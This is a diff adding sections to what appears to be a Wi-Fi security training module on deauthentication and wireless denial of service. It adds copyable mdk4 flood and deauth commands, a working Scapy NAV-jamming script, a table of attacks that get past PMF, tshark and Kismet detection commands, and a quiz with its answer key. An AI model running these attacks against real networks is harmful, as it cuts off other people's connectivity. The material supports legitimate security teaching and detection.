@@ -115,6 +115,27 @@
     .nav-btn.prev { border:1px solid var(--border); color:var(--text-dim); }
     .nav-btn.prev:hover { border-color:var(--accent); color:var(--accent); }
 
+    /* Quiz */
+    .quiz-container { background:var(--bg-card); border:1px solid var(--border); border-radius:var(--radius); padding:28px; margin:24px 0; }
+    .quiz-container h3 { font-size:14px; color:var(--accent); margin-bottom:20px; display:flex; align-items:center; gap:8px; }
+    .quiz-question { margin-bottom:28px; }
+    .quiz-question .q-text { font-size:14px; color:var(--text-head); margin-bottom:14px; line-height:1.5; }
+    .quiz-question .q-num { font-family:var(--font-mono); font-size:11px; color:var(--accent); margin-bottom:6px; }
+    .option-list { display:flex; flex-direction:column; gap:8px; }
+    .option-btn { background:var(--bg); border:1px solid var(--border); border-radius:6px; padding:10px 16px; color:var(--text); text-align:left; cursor:pointer; font-size:13px; transition:all 0.15s; font-family:var(--font-body); }
+    .option-btn:hover { border-color:var(--accent); color:var(--text-head); }
+    .option-btn.correct { border-color:var(--accent2); background:rgba(63,185,80,0.08); color:var(--accent2); }
+    .option-btn.wrong { border-color:var(--accent3); background:rgba(247,129,102,0.08); color:var(--accent3); }
+    .option-btn:disabled { cursor:default; }
+    .quiz-feedback { margin-top:10px; font-size:13px; padding:10px 14px; border-radius:6px; display:none; line-height:1.5; }
+    .quiz-feedback.show { display:block; }
+    .quiz-feedback.correct-fb { background:rgba(63,185,80,0.08); border:1px solid rgba(63,185,80,0.3); color:var(--accent2); }
+    .quiz-feedback.wrong-fb { background:rgba(247,129,102,0.08); border:1px solid rgba(247,129,102,0.3); color:var(--accent3); }
+    .quiz-score { display:none; text-align:center; padding:20px; border-top:1px solid var(--border); margin-top:20px; }
+    .quiz-score.show { display:block; }
+    .score-num { font-size:3rem; font-weight:700; color:var(--accent); font-family:var(--font-mono); }
+    .score-label { font-size:14px; color:var(--text-dim); margin-top:4px; }
+
     ::-webkit-scrollbar { width:6px; height:6px; }
     ::-webkit-scrollbar-track { background:var(--bg); }
     ::-webkit-scrollbar-thumb { background:var(--border); border-radius:3px; }
@@ -300,6 +321,261 @@
       </div>
     </section>
 
+    <!-- Section 5: mdk4 Full Reference -->
+    <section id="mdk4">
+      <h2><span class="section-num">05</span> mdk4 — Full Mode Reference</h2>
+      <p>mdk4 provides specialized wireless DoS beyond simple deauth. Each mode targets a different layer of the protocol stack.</p>
+
+      <div class="table-wrap">
+        <table>
+          <thead><tr><th>Mode</th><th>Letter</th><th>Target</th><th>Effect</th></tr></thead>
+          <tbody>
+            <tr><td>Beacon Flood</td><td><code>b</code></td><td>All clients in range</td><td>Overwhelms scanning, conceals real APs</td></tr>
+            <tr><td>Auth Flood</td><td><code>a</code></td><td>AP association table</td><td>Fills table, blocks legitimate clients</td></tr>
+            <tr><td>Deauth Amok</td><td><code>d</code></td><td>AP clients</td><td>Continuous disconnection, with blacklist/whitelist</td></tr>
+            <tr><td>Michael Shunning</td><td><code>m</code></td><td>TKIP networks only</td><td>Triggers AP MIC lockout (60s DoS)</td></tr>
+            <tr><td>EAPOL Flooding</td><td><code>e</code></td><td>AP state machine</td><td>Floods AP with auth starts → CPU exhaustion</td></tr>
+            <tr><td>WIDS Confusion</td><td><code>w</code></td><td>Wireless IDS</td><td>Fake attack signatures to confuse WIDS sensors</td></tr>
+          </tbody>
+        </table>
+      </div>
+
+      <div class="terminal">
+        <div class="terminal-bar">
+          <div class="terminal-dots"><span class="d-red"></span><span class="d-yellow"></span><span class="d-green"></span></div>
+          <span class="terminal-title">mdk4 — all modes with full flags</span>
+          <button class="terminal-copy" onclick="copyTerm(this,'copy-mdk4-full')">Copy</button>
+        </div>
+        <div class="terminal-body" id="copy-mdk4-full"><span class="cmt"># Deauth Amok mode — with target, whitelist, and speed control</span>
+<span class="prompt">kali@kali:~$ </span><span class="cmd">sudo mdk4 wlan0mon <span class="flag">d</span> <span class="flag">-B</span> <span class="str">AA:BB:CC:DD:EE:FF</span> <span class="flag">-w</span> <span class="str">whitelist.txt</span> <span class="flag">-s</span> <span class="str">300</span> <span class="flag">-c</span> <span class="str">6</span></span>
+<span class="cmt"># -B BSSID     → target only this AP (omit for all APs)</span>
+<span class="cmt"># -w file      → whitelist: do NOT deauth these MACs</span>
+<span class="cmt"># -b file      → blacklist: ONLY deauth these MACs</span>
+<span class="cmt"># -s N         → speed in packets/sec (default: 480)</span>
+<span class="cmt"># -c N         → lock to channel N</span>
+
+<span class="cmt"># Authentication flood — fills AP's association table</span>
+<span class="prompt">kali@kali:~$ </span><span class="cmd">sudo mdk4 wlan0mon <span class="flag">a</span> <span class="flag">-B</span> <span class="str">AA:BB:CC:DD:EE:FF</span> <span class="flag">-s</span> <span class="str">300</span></span>
+<span class="cmt"># Sends thousands of association requests from random MACs</span>
+<span class="cmt"># AP's station table fills up → legitimate clients refused</span>
+
+<span class="cmt"># EAPOL Start flooding — state machine exhaustion</span>
+<span class="prompt">kali@kali:~$ </span><span class="cmd">sudo mdk4 wlan0mon <span class="flag">e</span> <span class="flag">-t</span> <span class="str">AA:BB:CC:DD:EE:FF</span> <span class="flag">-s</span> <span class="str">200</span></span>
+<span class="cmt"># Floods AP with EAPOL-Start → AP generates ANonces → CPU/memory exhaustion</span>
+
+<span class="cmt"># Beacon flood with WPA2 tags + custom SSID file</span>
+<span class="prompt">kali@kali:~$ </span><span class="cmd">sudo mdk4 wlan0mon <span class="flag">b</span> <span class="flag">-f</span> <span class="str">ssids.txt</span> <span class="flag">-w</span> <span class="flag">-c</span> <span class="str">6</span> <span class="flag">-s</span> <span class="str">500</span></span>
+<span class="cmt"># -f file      → SSID list (one per line)</span>
+<span class="cmt"># -w           → add WPA2 tags to fake beacons (appear encrypted)</span>
+<span class="cmt"># -g           → use 54 Mbit 802.11g rates</span></div>
+      </div>
+    </section>
+
+    <!-- Section 6: Advanced DoS Techniques -->
+    <section id="advanced">
+      <h2><span class="section-num">06</span> Advanced DoS Techniques</h2>
+
+      <h3>NAV-Based DoS — Silencing the Channel</h3>
+      <p>The Duration/ID field in every 802.11 frame sets how long other stations must defer. Sending frames with the maximum Duration (32,767 µs) blocks all transmission without any deauth.</p>
+
+      <div class="callout attack">
+        <span class="ci">&#9889;</span>
+        <div><strong>PMF immune:</strong> NAV DoS exploits the Duration field in data/control frames — it cannot be blocked by 802.11w which only protects management frames like deauth/disassoc.</div>
+      </div>
+
+      <div class="terminal">
+        <div class="terminal-bar">
+          <div class="terminal-dots"><span class="d-red"></span><span class="d-yellow"></span><span class="d-green"></span></div>
+          <span class="terminal-title">NAV DoS + Michael Shunning</span>
+          <button class="terminal-copy" onclick="copyTerm(this,'copy-nav')">Copy</button>
+        </div>
+        <div class="terminal-body" id="copy-nav"><span class="cmt"># NAV DoS — Scapy: maximum Duration field silences all stations</span>
+<span class="out">from scapy.all import *</span>
+<span class="out">from scapy.layers.dot11 import Dot11, RadioTap</span>
+<span class="out"></span>
+<span class="out">frame = (</span>
+<span class="out">    RadioTap() /</span>
+<span class="out">    Dot11(type=<span class="str">2</span>, subtype=<span class="str">4</span>,       <span class="cmt"># Data Null function</span></span>
+<span class="out">          FCfield=<span class="str">0x01</span>,              <span class="cmt"># ToDS=1</span></span>
+<span class="out">          addr1=<span class="str">"ff:ff:ff:ff:ff:ff"</span>,</span>
+<span class="out">          addr2=<span class="str">"00:11:22:33:44:55"</span>,</span>
+<span class="out">          addr3=<span class="str">"ff:ff:ff:ff:ff:ff"</span>,</span>
+<span class="out">          ID=<span class="str">0x7FFF</span>)               <span class="cmt"># Duration = 32,767 µs (maximum)</span></span>
+<span class="out">)</span>
+<span class="out">sendp(frame, iface=<span class="str">"wlan0mon"</span>, loop=True, inter=<span class="str">0.001</span>)</span>
+
+<span class="cmt"># Michael Shunning — trigger TKIP MIC lockout (DoS for 60s)</span>
+<span class="prompt">kali@kali:~$ </span><span class="cmd">sudo mdk4 wlan0mon <span class="flag">m</span> <span class="flag">-B</span> <span class="str">AA:BB:CC:DD:EE:FF</span> <span class="flag">-t</span> <span class="str">11:22:33:44:55:66</span></span>
+<span class="cmt"># Only effective against WPA-TKIP APs (NOT WPA2-CCMP)</span>
+<span class="cmt"># 2 MIC failures in 60s → AP lockout for 60s → all clients disconnected</span></div>
+      </div>
+    </section>
+
+    <!-- Section 7: PMF Bypass Reference -->
+    <section id="pmf-bypass">
+      <h2><span class="section-num">07</span> PMF Status &amp; Bypass Reference</h2>
+
+      <div class="table-wrap">
+        <table>
+          <thead><tr><th>Approach</th><th>vs PMF Disabled</th><th>vs PMF Capable</th><th>vs PMF Required</th></tr></thead>
+          <tbody>
+            <tr><td>Deauth injection (aireplay-ng)</td><td style="color:var(--accent2)">✓ Works</td><td style="color:var(--warn)">Pre-assoc only</td><td style="color:var(--accent3)">✗ Blocked</td></tr>
+            <tr><td>NAV DoS (Duration field)</td><td style="color:var(--accent2)">✓ Works</td><td style="color:var(--accent2)">✓ Works</td><td style="color:var(--accent2)">✓ Works</td></tr>
+            <tr><td>EAPOL flooding (mdk4 e)</td><td style="color:var(--accent2)">✓ Works</td><td style="color:var(--accent2)">✓ Works</td><td style="color:var(--accent2)">✓ Works</td></tr>
+            <tr><td>Auth flooding (mdk4 a)</td><td style="color:var(--accent2)">✓ Works</td><td style="color:var(--accent2)">✓ Works</td><td style="color:var(--accent2)">✓ Works</td></tr>
+            <tr><td>Beacon flooding (mdk4 b)</td><td style="color:var(--accent2)">✓ Works</td><td style="color:var(--accent2)">✓ Works</td><td style="color:var(--accent2)">✓ Works</td></tr>
+            <tr><td>PMKID attack (Module 12)</td><td style="color:var(--accent2)">✓ Works</td><td style="color:var(--accent2)">✓ Works</td><td style="color:var(--accent2)">✓ Works</td></tr>
+            <tr><td>Michael shunning (mdk4 m)</td><td style="color:var(--accent2)">TKIP only</td><td style="color:var(--accent2)">TKIP only</td><td style="color:var(--accent2)">TKIP only</td></tr>
+          </tbody>
+        </table>
+      </div>
+    </section>
+
+    <!-- Section 8: Detection -->
+    <section id="detection">
+      <h2><span class="section-num">08</span> Detection &amp; Countermeasures</h2>
+
+      <div class="terminal">
+        <div class="terminal-bar">
+          <div class="terminal-dots"><span class="d-red"></span><span class="d-yellow"></span><span class="d-green"></span></div>
+          <span class="terminal-title">tshark — deauth attack detection</span>
+          <button class="terminal-copy" onclick="copyTerm(this,'copy-detect')">Copy</button>
+        </div>
+        <div class="terminal-body" id="copy-detect"><span class="cmt"># Count deauth frames per source MAC (find the attacker)</span>
+<span class="prompt">kali@kali:~$ </span><span class="cmd">tshark <span class="flag">-r</span> capture.pcapng <span class="flag">-Y</span> <span class="str">"wlan.fc.type_subtype==12"</span> <span class="flag">-T</span> fields <span class="flag">-e</span> wlan.sa | sort | uniq -c | sort -rn</span>
+<span class="out-err">  847  AA:BB:CC:DD:EE:FF   ← 847 deauths from one MAC = ATTACKER</span>
+
+<span class="cmt"># Show reason codes (7 = aireplay-ng injected)</span>
+<span class="prompt">kali@kali:~$ </span><span class="cmd">tshark <span class="flag">-r</span> capture.pcapng <span class="flag">-Y</span> <span class="str">"wlan.fc.type_subtype==12"</span> <span class="flag">-T</span> fields <span class="flag">-e</span> wlan.sa <span class="flag">-e</span> wlan.da <span class="flag">-e</span> wlan_mgt.fixed.reason_code</span>
+<span class="out-err">AA:BB:CC:DD:EE:FF   ff:ff:ff:ff:ff:ff   7   ← injected broadcast deauth</span>
+
+<span class="cmt"># Live monitoring (correct tcpdump syntax)</span>
+<span class="prompt">kali@kali:~$ </span><span class="cmd">sudo tcpdump <span class="flag">-i</span> wlan0mon <span class="flag">-e</span> <span class="str">'(type mgt subtype deauth) or (type mgt subtype disassoc)'</span></span>
+
+<span class="cmt"># Kismet IDS — automatic deauth flood alerting</span>
+<span class="prompt">kali@kali:~$ </span><span class="cmd">sudo kismet <span class="flag">-c</span> wlan0mon</span>
+<span class="cmt"># Auto-alerts on: deauth floods, beacon floods, rogue APs, PMKID captures</span></div>
+      </div>
+    </section>
+
+    <!-- Section 9: Quiz -->
+    <section id="quiz">
+      <h2><span class="section-num">09</span> Knowledge Check</h2>
+
+      <div class="quiz-container">
+        <h3>&#127358; Module 08 Quiz &nbsp;<span style="font-size:11px;color:var(--text-dim);font-weight:400">8 questions</span></h3>
+
+        <!-- Q1 -->
+        <div class="quiz-question" id="q1">
+          <div class="q-num">Question 1 of 8</div>
+          <div class="q-text">A deauthentication frame drops a client from State 3 to which state, and what must the client do to resume data transmission?</div>
+          <div class="option-list">
+            <button class="option-btn" onclick="answer(this,'q1',false)">State 2 — client must re-associate only</button>
+            <button class="option-btn" onclick="answer(this,'q1',true)">State 1 — client must re-authenticate AND re-associate, triggering a full WPA2 4-way handshake</button>
+            <button class="option-btn" onclick="answer(this,'q1',false)">State 0 — client must rediscover the AP and re-scan</button>
+            <button class="option-btn" onclick="answer(this,'q1',false)">State 2 — client must perform a new 4-way handshake only</button>
+          </div>
+          <div class="quiz-feedback" id="fb-q1"></div>
+        </div>
+
+        <!-- Q2 -->
+        <div class="quiz-question" id="q2">
+          <div class="q-num">Question 2 of 8</div>
+          <div class="q-text">Why can't 802.11w (PMF Required) block a NAV-based DoS attack?</div>
+          <div class="option-list">
+            <button class="option-btn" onclick="answer(this,'q2',false)">Because PMF only applies to WPA3 networks, not WPA2</button>
+            <button class="option-btn" onclick="answer(this,'q2',true)">Because NAV DoS exploits the Duration/ID field in data/control frames — 802.11w only encrypts management frames like deauth and disassoc</button>
+            <button class="option-btn" onclick="answer(this,'q2',false)">Because the NAV field is encrypted separately from the frame body</button>
+            <button class="option-btn" onclick="answer(this,'q2',false)">Because NAV DoS uses broadcast frames that PMF cannot filter</button>
+          </div>
+          <div class="quiz-feedback" id="fb-q2"></div>
+        </div>
+
+        <!-- Q3 -->
+        <div class="quiz-question" id="q3">
+          <div class="q-num">Question 3 of 8</div>
+          <div class="q-text">What does mdk4's authentication flooding mode (<code>a</code>) exhaust, and what is the effect on legitimate users?</div>
+          <div class="option-list">
+            <button class="option-btn" onclick="answer(this,'q3',false)">It exhausts the AP's CPU with encryption calculations, causing all frames to be dropped</button>
+            <button class="option-btn" onclick="answer(this,'q3',true)">It fills the AP's station association table with fake MACs — consumer APs support ~100-256 entries. When full, legitimate clients receive "AP busy" and cannot associate</button>
+            <button class="option-btn" onclick="answer(this,'q3',false)">It exhausts DHCP IP address pool so new clients get no IP address</button>
+            <button class="option-btn" onclick="answer(this,'q3',false)">It floods the AP with beacon responses until its radio resets</button>
+          </div>
+          <div class="quiz-feedback" id="fb-q3"></div>
+        </div>
+
+        <!-- Q4 -->
+        <div class="quiz-question" id="q4">
+          <div class="q-num">Question 4 of 8</div>
+          <div class="q-text">What does reason code 7 in a deauthentication frame indicate, and how can you use it for detection?</div>
+          <div class="option-list">
+            <button class="option-btn" onclick="answer(this,'q4',false)">The client voluntarily disconnected — no attack indicator</button>
+            <button class="option-btn" onclick="answer(this,'q4',true)">Reason 7 = "Class 3 frame from non-associated STA" — the default code used by aireplay-ng. Seeing many reason-7 deauths from a single non-AP MAC is a strong indicator of injection</button>
+            <button class="option-btn" onclick="answer(this,'q4',false)">The AP is rebooting — common during firmware updates</button>
+            <button class="option-btn" onclick="answer(this,'q4',false)">WPA3 SAE handshake was rejected — client needs to reconnect with correct credentials</button>
+          </div>
+          <div class="quiz-feedback" id="fb-q4"></div>
+        </div>
+
+        <!-- Q5 -->
+        <div class="quiz-question" id="q5">
+          <div class="q-num">Question 5 of 8</div>
+          <div class="q-text">In the mdk4 deauth amok mode, what does the <code>-w whitelist.txt</code> flag do?</div>
+          <div class="option-list">
+            <button class="option-btn" onclick="answer(this,'q5',false)">It adds WPA2 tags to the deauth frames to bypass PMF</button>
+            <button class="option-btn" onclick="answer(this,'q5',true)">It specifies a list of MAC addresses that should NOT be deauthenticated — used to protect specific clients (e.g., your own devices) from the DoS</button>
+            <button class="option-btn" onclick="answer(this,'q5',false)">It sets the channel whitelist — only deauth on channels listed in the file</button>
+            <button class="option-btn" onclick="answer(this,'q5',false)">It writes attack output to a log file named whitelist.txt</button>
+          </div>
+          <div class="quiz-feedback" id="fb-q5"></div>
+        </div>
+
+        <!-- Q6 -->
+        <div class="quiz-question" id="q6">
+          <div class="q-num">Question 6 of 8</div>
+          <div class="q-text">Michael shunning (mdk4 mode <code>m</code>) only works against which type of network and why?</div>
+          <div class="option-list">
+            <button class="option-btn" onclick="answer(this,'q6',false)">WPA2-CCMP — because CCMP uses Michael MIC for integrity</button>
+            <button class="option-btn" onclick="answer(this,'q6',true)">WPA-TKIP only — because the Michael algorithm is specific to TKIP's MIC implementation. WPA2-CCMP uses AES-CCMP which has no Michael countermeasure</button>
+            <button class="option-btn" onclick="answer(this,'q6',false)">WEP networks — because Michael replaces CRC-32 in WEP</button>
+            <button class="option-btn" onclick="answer(this,'q6',false)">WPA3-SAE only — because SAE uses the same MIC derivation</button>
+          </div>
+          <div class="quiz-feedback" id="fb-q6"></div>
+        </div>
+
+        <!-- Q7 -->
+        <div class="quiz-question" id="q7">
+          <div class="q-num">Question 7 of 8</div>
+          <div class="q-text">In a Scapy deauth script, why send deauth frames in BOTH directions — AP→Client AND Client→AP?</div>
+          <div class="option-list">
+            <button class="option-btn" onclick="answer(this,'q7',false)">Both directions are needed to satisfy 802.11w MIC requirements</button>
+            <button class="option-btn" onclick="answer(this,'q7',true)">Sending AP→Client disconnects the client from the AP's perspective; sending Client→AP disconnects the AP's association with the client. Both ensure neither party believes the connection is valid</button>
+            <button class="option-btn" onclick="answer(this,'q7',false)">The AP direction captures the handshake; the client direction prevents re-association</button>
+            <button class="option-btn" onclick="answer(this,'q7',false)">It's not necessary — one direction is sufficient for a successful deauth</button>
+          </div>
+          <div class="quiz-feedback" id="fb-q7"></div>
+        </div>
+
+        <!-- Q8 -->
+        <div class="quiz-question" id="q8">
+          <div class="q-num">Question 8 of 8</div>
+          <div class="q-text">Write the tshark command to identify which source MAC is sending the most deauthentication frames in a capture file.</div>
+          <div class="option-list">
+            <button class="option-btn" onclick="answer(this,'q8',false)"><code>tcpdump -r cap.pcapng type mgt subtype deauth | sort | uniq -c</code></button>
+            <button class="option-btn" onclick="answer(this,'q8',false)"><code>tshark -r cap.pcapng -Y "eapol" -T fields -e wlan.sa | sort | uniq -c | sort -rn</code></button>
+            <button class="option-btn" onclick="answer(this,'q8',true)"><code>tshark -r cap.pcapng -Y "wlan.fc.type_subtype==12" -T fields -e wlan.sa | sort | uniq -c | sort -rn</code></button>
+            <button class="option-btn" onclick="answer(this,'q8',false)"><code>tshark -r cap.pcapng -Y "wlan.fc.subtype==12" -T fields -e wlan.bssid | sort -u</code></button>
+          </div>
+          <div class="quiz-feedback" id="fb-q8"></div>
+        </div>
+
+        <div class="quiz-score" id="quizScore">
+          <div class="score-num" id="scoreNum">0/8</div>
+          <div class="score-label" id="scoreLabel"></div>
+        </div>
+      </div>
+    </section>
+
     <!-- Nav -->
     <div class="nav-footer">
       <a href="../module-07-wpa2-cracking/" class="nav-btn prev">&#8592; Module 07: WPA2 Cracking</a>
@@ -318,6 +594,78 @@
       btn.classList.add('copied');
       setTimeout(() => { btn.textContent = 'Copy'; btn.classList.remove('copied'); }, 2000);
     });
+  }
+
+  // ── Quiz ──────────────────────────────────────────────────────
+  const TOTAL_Q = 8;
+  const qAnswered = {};
+  const qFeedbacks = {
+    q1: {
+      correct: "Correct. Deauthentication drops a client to State 1 (Unauthenticated, Unassociated). From State 1, the client must go through: Authentication Request/Response → State 2, then Association Request/Response → State 3, triggering a full WPA2 4-way handshake. This is exactly why deauth enables handshake capture.",
+      wrong: "Incorrect. Deauthentication drops to State 1 (not State 2). From State 1, the client must re-authenticate AND re-associate — performing a new 4-way handshake. Disassociation drops to State 2, requiring only re-association."
+    },
+    q2: {
+      correct: "Correct. 802.11w/PMF protects management frames (type=0) specifically deauth (subtype 12) and disassoc (subtype 10). The NAV Duration/ID field is in the MAC header of ALL frame types — including data and control frames. PMF has no scope to protect this field.",
+      wrong: "Incorrect. 802.11w only encrypts and authenticates deauthentication and disassociation management frames. The Duration/ID field in the 802.11 MAC header is present in ALL frames including data frames — PMF cannot protect it."
+    },
+    q3: {
+      correct: "Correct. mdk4's auth flooding mode sends thousands of Association Requests from random spoofed MACs. Consumer APs maintain a finite station table (typically 64-256 entries). When full, new legitimate clients are rejected with association denial — effectively a DoS without touching existing sessions.",
+      wrong: "Incorrect. mdk4 auth mode exhausts the AP's station association table — a finite table that maps client MACs to session state. When all table slots are filled with fake MACs, legitimate clients cannot associate. This is different from CPU exhaustion."
+    },
+    q4: {
+      correct: "Correct. Reason code 7 = 'Class 3 frame received from non-associated STA' — this is the default reason code injected by aireplay-ng --deauth. Legitimate AP deauths use codes 1, 2, or 3. Seeing many reason-7 deauths from a non-AP source MAC is a reliable injection indicator for IDS rules.",
+      wrong: "Incorrect. Reason code 7 is 'Class 3 frame from non-associated STA' — the default code used by aireplay-ng. Legitimate AP deauths typically use code 1 (unspecified) or 2 (auth no longer valid). Code 7 from an unknown source is a reliable injection signature."
+    },
+    q5: {
+      correct: "Correct. -w whitelist.txt tells mdk4 to skip deauthenticating any MAC listed in the file. This is useful in authorized engagements to protect specific devices (e.g., your own testing equipment or critical infrastructure) from the DoS while still attacking the target.",
+      wrong: "Incorrect. In mdk4, -w specifies a whitelist file — MAC addresses that will NOT be deauthenticated. The -b flag is the blacklist (ONLY target these MACs). The -w flag is an exclusion list to protect specific devices."
+    },
+    q6: {
+      correct: "Correct. Michael is the MIC algorithm in TKIP (WPA-TKIP). TKIP's Michael countermeasure mandates: if 2 MIC failures occur within 60 seconds, the AP locks out all TKIP traffic for 60 seconds. WPA2-CCMP uses AES-CCMP for integrity — no Michael algorithm, no shunning countermeasure.",
+      wrong: "Incorrect. Michael shunning targets WPA-TKIP only. The Michael algorithm is the integrity check used in TKIP. WPA2-CCMP replaced both RC4/TKIP and Michael with AES-CCMP, which has no built-in 'shunning' countermeasure — it's immune to this specific attack."
+    },
+    q7: {
+      correct: "Correct. In 802.11, both the AP and the client maintain their own state machine. Sending only AP→Client deauth may disconnect the client, but the AP still thinks the client is associated. Sending both directions ensures both sides clear the association — preventing the AP from sending unicast data to the now-disconnected client.",
+      wrong: "Incorrect. Sending deauth in both directions ensures complete state cleanup: AP→Client (client clears its association state) and Client→AP (AP clears its record of the client). With only one direction, one party may still think the connection is valid, causing issues."
+    },
+    q8: {
+      correct: "Correct. wlan.fc.type_subtype==12 filters deauthentication frames. -T fields -e wlan.sa extracts source MAC addresses. sort | uniq -c | sort -rn sorts by frequency (highest first). The MAC with the largest count is the attacker injecting deauth frames.",
+      wrong: "Incorrect. The correct command uses wlan.fc.type_subtype==12 (deauth filter), -e wlan.sa (source MAC), and sort | uniq -c | sort -rn (frequency sort). tcpdump's filter syntax for frame subtypes is different and less reliable. EAPOL filter shows handshake frames, not deauths."
+    }
+  };
+
+  let qScore = 0;
+  let qCount = 0;
+
+  function answer(btn, qId, isCorrect) {
+    if (qAnswered[qId]) return;
+    qAnswered[qId] = true;
+    qCount++;
+    const qEl = document.getElementById(qId);
+    const buttons = qEl.querySelectorAll('.option-btn');
+    buttons.forEach(b => b.disabled = true);
+    const fb = document.getElementById('fb-' + qId);
+    if (isCorrect) {
+      btn.classList.add('correct');
+      qScore++;
+      fb.textContent = '✓ ' + qFeedbacks[qId].correct;
+      fb.className = 'quiz-feedback correct-fb show';
+    } else {
+      btn.classList.add('wrong');
+      fb.textContent = '✗ ' + qFeedbacks[qId].wrong;
+      fb.className = 'quiz-feedback wrong-fb show';
+      buttons.forEach(b => { if (b.onclick && b.onclick.toString().includes('true')) b.classList.add('correct'); });
+    }
+    if (qCount === TOTAL_Q) {
+      const scoreEl = document.getElementById('quizScore');
+      const numEl = document.getElementById('scoreNum');
+      const labelEl = document.getElementById('scoreLabel');
+      numEl.textContent = qScore + '/' + TOTAL_Q;
+      const pct = qScore / TOTAL_Q;
+      labelEl.textContent = pct === 1 ? 'Perfect — ready for Module 09!' : pct >= 0.75 ? 'Strong — review missed questions.' : pct >= 0.5 ? 'Getting there — re-read the mdk4 modes and PMF bypass sections.' : 'Re-read the state machine, mdk4, NAV DoS, and detection sections.';
+      numEl.style.color = pct === 1 ? 'var(--accent2)' : pct >= 0.625 ? 'var(--warn)' : 'var(--accent3)';
+      scoreEl.classList.add('show');
+    }
   }
 
   // Deauth simulation
